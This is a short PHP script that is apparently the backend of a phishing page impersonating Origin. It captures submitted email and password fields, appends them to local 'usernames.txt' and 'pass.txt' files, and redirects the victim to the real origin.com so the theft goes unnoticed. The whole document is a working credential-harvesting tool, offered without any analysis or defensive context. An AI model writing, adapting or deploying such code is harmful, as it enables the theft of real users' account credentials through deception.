<?php

file_put_contents("usernames.txt", "Origin Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Origin Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.origin.com');
?>
